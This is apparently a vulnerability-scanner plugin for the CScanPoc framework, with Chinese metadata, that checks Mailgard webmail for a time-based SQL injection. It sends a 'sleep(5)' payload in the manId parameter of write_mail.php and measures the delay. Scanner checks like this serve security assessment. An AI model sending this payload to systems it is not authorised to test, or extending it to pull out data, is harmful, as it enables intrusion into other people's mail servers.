# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Mailgard_0013'  # 平台漏洞编号，留空
    name = '佑友mailgard webmail邮件系统sql注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-08'  # 漏洞公布时间
    desc = '''
        write_mail.php: 参数未过滤导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3211/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mailgard'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '479d5ac8-e797-456e-91f2-35b444278c54'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload_sleep = "/src/write_mail.php?manId=sleep(5)"
            payload_normal = "/src/write_mail.php?manId=1"
            time_start = time.time()
            requests.get(self.target + payload_normal)
            time_end_normal = time.time()
            requests.get(self.target + payload_sleep)
            time_end_sleep = time.time()

            if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
